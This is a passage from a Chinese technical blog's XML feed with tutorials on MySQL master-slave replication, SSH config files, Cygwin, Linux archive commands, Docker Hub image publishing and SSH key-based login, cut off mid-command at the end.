        <content type="html"><![CDATA[<p>Mysql 主从配置是数据库同步的必要步骤。</p><a id="more"></a><p>主机环境：</p><ul><li>Ubuntu 18.04 LTS</li><li>Mysql 5.7</li></ul><p>下面会将主数据库简称为Master，从数据库简称为 Slave。</p><h2 id="配置Master"><a href="#配置Master" class="headerlink" title="配置Master"></a>配置Master</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br><span class="line"></span><br><span class="line"># 打开二进制日志</span><br><span class="line">[mysqld]</span><br><span class="line">server_id&#x3D;1</span><br><span class="line">log-bin&#x3D;master-bin</span><br><span class="line">log-bin-index&#x3D;master-bin.index</span><br></pre></td></tr></table></figure><p>创建同步用户，并赋予权限（如果从服务器以reql 这个账号进行连接，就赋予同步数据库的权限，并且这个权限是所有数据库的所有数据表）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -uroot -p </span><br><span class="line">mysql&gt; create user repl;</span><br><span class="line">mysql&gt; grant replication slave on *.* to &#39;user&#39;@&#39;your_slave_addr&#39; identified by &#39;password&#39;</span><br><span class="line">mysql&gt; flush privileges;</span><br></pre></td></tr></table></figure><p>上面的IP 是指 Slave 服务器的IP 地址。<br>重启Mysql 服务。</p><p>查看Master 配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show master status;</span><br></pre></td></tr></table></figure><h2 id="Salve-配置"><a href="#Salve-配置" class="headerlink" title="Salve 配置"></a>Salve 配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br><span class="line"></span><br><span class="line"># 打开relay 日志</span><br><span class="line">[mysqld]</span><br><span class="line">server_id&#x3D;2</span><br><span class="line">relay-log-index&#x3D;slave-relay-bin.index</span><br><span class="line">relay-log&#x3D;slave-relay-bin</span><br></pre></td></tr></table></figure><p>重启Mysql 服务。</p><p>指定Master 主机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -uroot -p</span><br><span class="line">mysql&gt; change master to master_host&#x3D;&quot;your master ip &quot;, master_port&#x3D;3306, master_user&#x3D;&#39;repl&#39;,master_password&#x3D;&#39;password&#39;,master_log_file&#x3D;&#39;master-bin.000001&#39;,master_log_pos&#x3D;0;</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>master_host</code>：Master∑主机的外网IP 地址</li><li><code>master_port</code>：端口</li><li><code>master_user</code>：Master主机上进行同步的用户</li><li><code>master_password</code>：密码</li><li><code>master_log_file</code>：Master 输出的二进制文件的名称（在Master 主机上使用<code>show master status</code>命令查看）</li><li><code>master_log_pos</code>：哪里开始同步</li></ul><p>开启主从同步</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; start slave;</span><br></pre></td></tr></table></figure><p>查看从库同步状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show slave status;</span><br></pre></td></tr></table></figure><h3 id="可能会遇到的问题"><a href="#可能会遇到的问题" class="headerlink" title="可能会遇到的问题"></a>可能会遇到的问题</h3><blockquote><p>Last_Errno: 1146<br>  Last_Error: Error executing row event: ‘Table ‘panda.t’ doesn’t exist’</p></blockquote><p>解决办法：使用<code>slave-skip-errors</code> 参数跳过该错误。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">slave_skip_errors&#x3D;1146</span><br></pre></td></tr></table></figure><p>重启从库即可。</p>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>了解 SSH Config</title>
      <link href="/understand-ssh-config/"/>
      <url>/understand-ssh-config/</url>
      
        <content type="html"><![CDATA[<p>很早就接触到了SSH，起初并不知道有<code>ssh config</code>这样一个东西存在，基本上是摸着石头过河，中间遇到过不少问题，走过不少弯路。</p><p>最后总结出来了两个解决办法，今天无意间发现原来其中有一个这么好用的工具一直都被我忽略了。</p><a id="more"></a><h2 id="什么是SSH-Config"><a href="#什么是SSH-Config" class="headerlink" title="什么是SSH Config"></a>什么是SSH Config</h2><blockquote><p>先决条件：在使用ssh 之前，需要先安装好<code>Openssh</code>、<code>SSH1</code>或者是<code>SSH2</code>。（Linux、Mac用户请忽略）</p></blockquote><p><code>~/.ssh/config</code> 是通过ssh 连接远程服务器时使用的配置文件。</p><h2 id="为什么要使用SSH-Config"><a href="#为什么要使用SSH-Config" class="headerlink" title="为什么要使用SSH Config"></a>为什么要使用SSH Config</h2><p>例如：使用SSH 进行远程连接，一般会这样做：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh Boo@18.182.201.142</span><br></pre></td></tr></table></figure><p>在简单地连接情况下，它并不麻烦。但是当端口号不是默认值（22）时，当密钥对不是默认名称时，连接就变得复杂了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 指定端口连接</span><br><span class="line">$ ssh Boo@18.182.201.142 -p 2222</span><br><span class="line"></span><br><span class="line"># 非默认名称密钥认证</span><br><span class="line">$ ssh -i ~&#x2F;.ssh&#x2F;id_rsa_aliyun Boo@18.182.201.142</span><br><span class="line"></span><br><span class="line"># 以上两种情况综合</span><br><span class="line">$ ssh -i ~&#x2F;.ssh&#x2F;id_rsa_aliyun Boo@18.182.201.142 -p 2222</span><br></pre></td></tr></table></figure><p>此时，使用<code>ssh config</code>就变得很有用了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># vim ~&#x2F;.ssh&#x2F;config</span><br><span class="line">Host aliyun</span><br><span class="line">    HostName 18.182.201.142</span><br><span class="line">    Port 2222</span><br><span class="line">    User Boo</span><br><span class="line">    IdentityFile ~&#x2F;.ssh&#x2F;id_rsa_aliyun</span><br></pre></td></tr></table></figure><p>现在在连接使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh aliyun</span><br></pre></td></tr></table></figure><p>是不是非常的方便！就算此时手上有多台服务器需要管理，只要配置好对应的<code>~/.ssh/config</code>参数，就可以很轻松的进行连接了。</p><p>但需要注意的是：有关ssh 的配置不能分成多个文件，只能写在这一个文件中<code>~/.ssh/config</code>（如果你有更好的办法）。</p><p>SSH 的配置文件同样适用于其他程序，如：<code>scp</code>，<code>sftp</code>等。</p><h2 id="常用的配置选项"><a href="#常用的配置选项" class="headerlink" title="常用的配置选项"></a>常用的配置选项</h2><h3 id="配置文件格式"><a href="#配置文件格式" class="headerlink" title="配置文件格式"></a>配置文件格式</h3><ul><li>空行和以’＃’开头的行是注释。</li><li>每行以关键字开头，后跟参数。</li><li>配置选项可以用空格或可选的空格分隔，只需要一个=。</li><li>参数可以用双引号（”）括起来，以指定包含空格的参数。</li></ul><h3 id="常用关键字"><a href="#常用关键字" class="headerlink" title="常用关键字"></a>常用关键字</h3><p>SSH Config 的关键字不区分大小写，但是参数区分大小写。</p><ul><li><input checked="" disabled="" type="checkbox"> Host：可以理解为远程主机名的别名，最终指明这个名称进行连接，如：<code>ssh aliyun</code></li><li><input checked="" disabled="" type="checkbox"> HostName：需要远程连接的主机名，通常都是IP。</li><li><input checked="" disabled="" type="checkbox"> Port：指定连接端口</li><li><input checked="" disabled="" type="checkbox"> User：指定连接用户</li><li><input checked="" disabled="" type="checkbox"> IdentityFile：指明远程连接密钥文件</li></ul><blockquote><p>注：Host 关键字可以包含以下模式匹配：</p></blockquote><ul><li><code>*</code>- 匹配零个或多个字符。例如，Host <em>将匹配所有主机，同时`192.168.0.</em><code>匹配</code>192.168.0.0/24`子网中的所有主机。</li><li>? - 恰好匹配一个字符。该模式Host <code>10.10.0.?</code>将匹配<code>10.10.0.[0-9]</code>范围内的所有主机。</li><li>!- 在模式的开头将否定其匹配例如，Host <code>10.10.0.*</code> <code>!10.10.0.5</code>将匹配<code>10.10.0.0/24</code>子网中的任何主机，除了<code>10.10.0.5</code>。</li></ul><h4 id="配置文件加载顺序"><a href="#配置文件加载顺序" class="headerlink" title="配置文件加载顺序"></a>配置文件加载顺序</h4><ul><li><p>全局配置文件：<code>/etc/ssh/ssh_config</code></p></li><li><p>用户配置文件：<code>~/.ssh/config</code></p></li></ul><p>ssh 客户端按以下优先顺序读取其配置：</p><ol><li>从命令行指定的选项</li><li>用户的ssh 配置文件</li><li>全局的ssh 配置文件</li></ol><p>如果希望SSH 客户端忽略ssh 配置文件中指定的所有选项，可以使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -F user@example.com</span><br></pre></td></tr></table></figure><h2 id="恢复连接"><a href="#恢复连接" class="headerlink" title="恢复连接"></a>恢复连接</h2><p>常用SSH 的小伙伴可能都知道，使用SSH 连接到远程服务器之后，如果一段时间没有输入任何指令，很有可能会断开与服务器的连接，需要重连就会变得很麻烦。</p><p>此时，ssh config 又变得很有用了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">＃定期向服务器发送实时报告（每60秒，可以自定义）</span><br><span class="line">ServerAliveInterval 60</span><br><span class="line"></span><br><span class="line"># 如果想要针对某个连接单独使用，需要放在Host 指令下，全局则放在最头部</span><br><span class="line">Host aliyun</span><br><span class="line">    ServerAliveInterval 60</span><br></pre></td></tr></table></figure><h3 id="可能感兴趣的内容"><a href="#可能感兴趣的内容" class="headerlink" title="可能感兴趣的内容"></a>可能感兴趣的内容</h3><ul><li><a href="https://linuxize.com/post/how-to-change-ssh-port-in-linux/" target="_blank" rel="noopener">如何在Linux 中更改SSH 端口</a></li><li><a href="https://qiita.com/passol78/items/2ad123e39efeb1a5286b#sshconfig%E3%81%A8%E3%81%AF" target="_blank" rel="noopener">关于 ~/.ssh/config</a></li><li><a href="https://linuxize.com/post/using-the-ssh-config-file/" target="_blank" rel="noopener">使用 SSH 配置文件</a></li><li><a href="https://man.openbsd.org/OpenBSD-current/man5/ssh_config.5" target="_blank" rel="noopener">ssh_config 指令详解</a></li><li><a href="https://www.ssh.com/" target="_blank" rel="noopener">SSH 官网</a></li><li><a href="https://www.ssh.com/ssh/config/" target="_blank" rel="noopener">OpenSSH 客户端SSH 配置文件</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cygwin 快速上手</title>
      <link href="/cygwin-quick-start/"/>
      <url>/cygwin-quick-start/</url>
      
        <content type="html"><![CDATA[<p>在很早之前就听说过<code>Cygwin</code>和<code>MinGW64</code>这两个东西，只是当时不是很理解这两个东西是做什么的，还经常和<code>msysGit</code> 搞混淆，加上最近用<code>MinGW64</code>用的很不顺手，所以打算安装一个<code>Cygwin</code>。</p><a id="more"></a><h2 id="区别与联系"><a href="#区别与联系" class="headerlink" title="区别与联系"></a>区别与联系</h2><p>首先来介绍下这三者分别是什么。</p><h3 id="Cygwin"><a href="#Cygwin" class="headerlink" title="Cygwin"></a>Cygwin</h3><p>Cygwin是一个类似Unix的环境和Microsoft Windows命令行界面。</p><p>大量GNU和开源工具，提供类似于 Windows上的 Linux发行版的功能。用官网的话说就是：在Windows 上获取Linux 的感觉。</p><h3 id="MinGW64"><a href="#MinGW64" class="headerlink" title="MinGW64"></a>MinGW64</h3><p>MSYS(MSYS | MinGW) 是一个在 Windows 下的类<code>Unit</code>工作环境。因为 Git 里面包含很多 Shell 跟 Perl 脚本，所以它(Git)需要一个这样的环境。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200901221056.png" alt=""></p><p>每次右键打开<code>Git Bash</code>时，其终端就是<code>MinGW64</code></p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200901221113.png" alt=""></p><h3 id="msysGit"><a href="#msysGit" class="headerlink" title="msysGit"></a>msysGit</h3><p>msysGit是一个构建环境，其中包含希望通过为Git for Windows编写代码来贡献所需的所有工具。</p><p>所以，Git for Windows 可以在 Windows 上安装可运行 Git 的最小环境，而 msysGit 是构建 Git for Windows 所需的环境。</p><h2 id="安装Cygwin"><a href="#安装Cygwin" class="headerlink" title="安装Cygwin"></a>安装Cygwin</h2><p>安装Cygwin 的过程比MinGW 要复杂些，其中主要需要注意的是模块部分。</p><p>Cygwin 好用的原因很大程度上是因为其功能之丰富，而各种功能则是来自于其模块。</p><p>终于安装好了，感觉很厉害的样子，是我想要的东西，希望在今后的日子中 能和它好好相处。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200901221141.png" alt=""></p><p>Mintty是一个终端仿真器 用于Cygwin的， MSYS或 Msys2 和衍生的项目，以及用于WSL。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200901221152.png" alt=""></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="http://mingw-w64.org/doku.php/download/windows" target="_blank" rel="noopener">从Windows 运行下载Cygwin64</a></li><li><a href="https://cygwin.com/index.html" target="_blank" rel="noopener">Cygwin 是什么，不是什么？–官网</a></li><li><a href="https://www.crifan.com/files/doc/docbook/cygwin_intro/release/html/cygwin_intro.html#install_cygwin_setup_exe" target="_blank" rel="noopener">Cygwin 安装教程 详细</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 终端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cygwin </tag>
            
            <tag> 终端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 压缩、解压、打包详解</title>
      <link href="/detailed-explanation-of-linux-compression-decompression-and-packaging/"/>
      <url>/detailed-explanation-of-linux-compression-decompression-and-packaging/</url>
      
        <content type="html"><![CDATA[<p>在Linux 中，解压、压缩、打包是日常会很频繁用到的几个操作，但是因为参数很多，没有记忆点，加上压缩文件的类型很多，如果不经常使用，是真的容易忘记。</p><a id="more"></a><p>所以这篇笔记就是用来整理常见的那些解压、压缩、打包的命令。</p><p>在正式学习之前，需要明确的两个概念，打包和压缩不是一回事：</p><ul><li>打包：是指将一大堆文件或目录变成一个总的文件。</li><li>压缩：则是将一个大文件通过压缩算法变成一个小文件。</li></ul><p>为什么要区分这两个概念呢？这源于Linux 中很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你得先将这一大堆文件先打成一个包（tar命令），然后再用压缩程序进行压缩（gzip bzip2命令）。</p><h2 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h2><h3 id="压缩-打包"><a href="#压缩-打包" class="headerlink" title="压缩/打包"></a>压缩/打包</h3><p>仅打包，不压缩。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cvf foo.tar foo</span><br></pre></td></tr></table></figure><p><code>foo.tar</code>这个文件名是自定义的，只是习惯上我们使用 <code>.tar</code> 作为包文件。</p><p>打包，且压缩。<code>-z</code>参数表示以 <code>.tar.gz</code> 或者 <code>.tgz</code> 后缀名代表 gzip 压缩过的 tar 包。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcvf foo.tar.gz foo</span><br></pre></td></tr></table></figure><p>打包，且压缩。<code>-j</code> 参数表示以 <code>.tar.bz2</code> 后缀名作为tar包名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -jcvf foo.tar.gz foo</span><br></pre></td></tr></table></figure><h3 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h3><p>在当前目录下直接解压：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf foo.tar.gz</span><br></pre></td></tr></table></figure><p>注意，如果这个目录下有同名的文件，不会询问，直接覆盖。</p><p>解压至指定文件夹：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf foo.tar.gz -C &lt;dir name&gt;</span><br></pre></td></tr></table></figure><h2 id="gzip"><a href="#gzip" class="headerlink" title="gzip"></a>gzip</h2><p>gzip 命令用来压缩文件。文件经它压缩过后，其名称后面会多处 <code>.gz</code> 扩展名（不带 <code>.tar</code>）。</p><h3 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h3><p>将当前目录的每个文件压缩成<code>.gz</code>文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip *</span><br></pre></td></tr></table></figure><p>递归压缩指定目录的所有文件及子目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -r &lt;dir name&gt;</span><br></pre></td></tr></table></figure><h3 id="解压-1"><a href="#解压-1" class="headerlink" title="解压"></a>解压</h3><p>解压当前目录下的<code>foo.gz</code> 文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -d foo.gz</span><br></pre></td></tr></table></figure><p>解压完成之后，<code>foo.gz</code> 就变成了 <code>foo</code> 文件。</p><p>递归解压目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -dr &lt;dir name&gt;</span><br></pre></td></tr></table></figure><p>解压完成之后，<code>&lt;dir name&gt;</code> 目录下的所有 <code>.gz</code> 文件都会变成正常文件。</p><h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p><code>zip</code> 可以用来解压缩文件，或者对文件进行打包操作。文件经它压缩后会另外产生具有 <code>.zip</code> 扩展名的压缩文件。</p><h3 id="压缩-1"><a href="#压缩-1" class="headerlink" title="压缩"></a>压缩</h3><p>将当前目录下的指定目录，压缩为 <code>.zip</code>文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -q -r foo.zip &lt;dir name&gt;</span><br></pre></td></tr></table></figure><p>将指定目录下的所有文件及其文件夹，压缩为<code>.zip</code> 文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -q -r foo.zip &#x2F;&lt;path to dir&gt;</span><br></pre></td></tr></table></figure><p>注意，产生的压缩文件在执行命令的那个目录下。</p><h3 id="解压-2"><a href="#解压-2" class="headerlink" title="解压"></a>解压</h3><p>unzip 命令用于解压缩由 zip 命令压缩的 <code>.zip</code>压缩包。</p><p>查看压缩包内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -v foo.zip</span><br></pre></td></tr></table></figure><p>将压缩文件在指定目录下解压缩，如果已有相同的文件存在，要求 unzip命令不覆盖原先的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -n foo.zip -d &#x2F;&lt;file to dir&gt;</span><br></pre></td></tr></table></figure><p>将压缩文件在当前目下解压，如果已有相同的文件，不询问，直接覆盖。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -o foo.zip</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>Linux 下的压缩解压其实并不复杂，只是不常用的情况下，很容器忘记。</p><p>如果你不知道在什么场景下，该使用什么命令，可以参照：</p><ul><li>如果只有一个大文件，可以使用 <code>gzip</code> 或者 <code>zip</code>命令。</li><li>如果是一个完整的目录，里面有很多子目录以及文件，可以使用<code>tar</code>命令。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker Hub 快速上手</title>
      <link href="/docker-hub-quick-start/"/>
      <url>/docker-hub-quick-start/</url>
      
        <content type="html"><![CDATA[<p>最近将常使用的镜像放在了Docker 仓库（Docker Hub）上。GitHub 是托管代码的地方，而<a href="https://hub.docker.com/" target="_blank" rel="noopener">Docker Hub</a> 则是托管镜像的地方。</p><a id="more"></a><p>目前大部分需求都可以直接在 Docker Hub 中下载镜像来实现，如果想使用自己仓库中的镜像，那么需要先<a href="https://hub.docker.com/" target="_blank" rel="noopener">注册</a>一个账号。</p><h2 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h2><p>想要从 Docker Hub 使用自己的镜像之前，首先得<a href="https://hub.docker.com/repository/create" target="_blank" rel="noopener">创建</a>一个仓库，然后将目标镜镜像 push 到该仓库。</p><p>这个仓库可以是公开的也可以是私有的，这个并不影响你正常使用。</p><p>创建成功之后，就可以看到该仓库了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200830180907.png" alt=""></p><h2 id="发布镜像"><a href="#发布镜像" class="headerlink" title="发布镜像"></a>发布镜像</h2><p>在发布之前，确保你本地存在目标镜像，可以使用 <code>docker images</code>来查看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">adminer             latest              c3588b6003bb        3 weeks ago         90.4MB</span><br></pre></td></tr></table></figure><p>创建 Tag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 语法</span><br><span class="line">docker tag local-image:tagname new-repo:tagname</span><br><span class="line"></span><br><span class="line"># 实例</span><br><span class="line">docker tag adminer:latest hoooliday&#x2F;runfast:adminer</span><br></pre></td></tr></table></figure><p>前面的 <code>tagname</code> 是本地镜像的标签名称，后面的<code>tagname</code> 是该镜像在仓库中的标签名称。</p><p>再次查看本地镜像：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker images</span><br><span class="line">hoooliday&#x2F;runfast   adminer             c3588b6003bb        3 weeks ago         90.4MB</span><br><span class="line">adminer             latest              c3588b6003bb        3 weeks ago         90.4MB</span><br></pre></td></tr></table></figure><p>发布镜像：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 语法</span><br><span class="line">docker push new-repo:tagname</span><br><span class="line"></span><br><span class="line"># 实例</span><br><span class="line">docker push hoooliday&#x2F;runfast:adminer</span><br></pre></td></tr></table></figure><p>发布成功之后，可以打开 Docker Hub 在 Repositories 的列表中就看到刚才的镜像了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200830181829.png" alt=""></p><h2 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h2><p>首先需要在命令行中登录你的 docker hub 账号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker login</span><br></pre></td></tr></table></figure><p>拉取自己的镜像，这里以 <a href="https://hub.docker.com/_/adminer" target="_blank" rel="noopener">adminer</a> 这个镜像为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run --link mysql:mysql --name adminer \</span><br><span class="line">-d --restart&#x3D;always \</span><br><span class="line">-p 8006:8080 \</span><br><span class="line">hoooliday&#x2F;runfast:adminer</span><br></pre></td></tr></table></figure><p>唯一需要注意的就是最后一行，如果想要使用官方最新版本的 adminer ，那就直接写成 adminer，但如果想要使用自己的镜像，那就需要写成 <code>username/repo:tagname</code> 的格式。</p><p>查看本地所有镜像：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker images</span><br><span class="line">hoooliday&#x2F;runfast   adminer             c3588b6003bb        3 weeks ago         90.4MB</span><br></pre></td></tr></table></figure><p>此持就完成了Docker 镜像的发布和拉取了，当然这只是 Docker Hub 所有功能中的冰山一角。</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
          <category> Tutorial </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
            <tag> Docker </tag>
            
            <tag> Docker Hub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 如何生成密钥对进行 ssh 免密登录</title>
      <link href="/how-to-generate-a-key-pair-for-ssh-login-without-password/"/>
      <url>/how-to-generate-a-key-pair-for-ssh-login-without-password/</url>
      
        <content type="html"><![CDATA[<p>最近因为项目快要上线了，服务器从测试环境转到了生产环境，登录方式也从原来的密码认证替换成了密钥认证。</p><a id="more"></a><p>这么做的目的是为了防止服务器密码被暴力破解。</p><blockquote><p>ssh 是什么？</p></blockquote><p>ssh 是一种协议，它可以基于密码进行认证，也可以基于密钥去认证用户。</p><h2 id="生成密钥对"><a href="#生成密钥对" class="headerlink" title="生成密钥对"></a>生成密钥对</h2><p>这里我们使用 <code>RSA</code> 类型的加密类型来创建密钥对。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -f ~&#x2F;.ssh&#x2F;your_key_name</span><br></pre></td></tr></table></figure><ol><li><code>-f</code> 参数表示指定密钥对生成位置与名称</li><li>密钥对通常放在 <code>$HOME/.ssh</code> 目录下</li><li>回车即可创建密钥对，如果不需要为密钥对进行加密，那么可以一路回车。</li></ol><p>创建成功之后，可以看到 <code>.ssh</code> 目录下多了两个文件，分别是：</p><ul><li><code>your_key</code>：密钥对的私钥，通常放在客户端。</li><li><code>your_key.pub</code>：密钥对中的公钥，通常放在服务端。</li></ul><h2 id="将本地的公钥传到服务器上"><a href="#将本地的公钥传到服务器上" class="headerlink" title="将本地的公钥传到服务器上"></a>将本地的公钥传到服务器上</h2><p>注意：这里是将<code>your_key.pub</code> 公钥文件上传至你需要连接的服务器，而不是<code>your_key</code>私钥文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-copy-id -i ~&#x2F;.ssh&#x2F;your_key.pub user@&lt;ip address&gt; -pport</span><br></pre></td></tr></table></figure><p><code>-i</code> 参数表示使用指定的密钥，<code>-p</code>参数表示指定端口，ssh 的默认端口是 22，如果没有更改默认端口，则可以省略。</p><p>这里需要输入一次密码进行确认，如果成功之后，会看到以下内容：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200829105200.png" alt=""></p><blockquote><p>本地的公钥文件上传在服务器的哪里？</p></blockquote><p>在该用户的<code>.ssh/authorized_keys</code> 文件中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~&#x2F;.ssh&#x2F;authorized_keys</span><br></pre></td></tr></table></figure><h2 id="通过密钥对进行免密登录"><a href="#通过密钥对进行免密登录" class="headerlink" title="通过密钥对进行免密登录"></a>通过密钥对进行免密登录</h2><p>现在我们可以使用以下命令登录到服务器中了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p port -i ~&#x2F;.ssh&#x2F;your_key user@&lt;ip 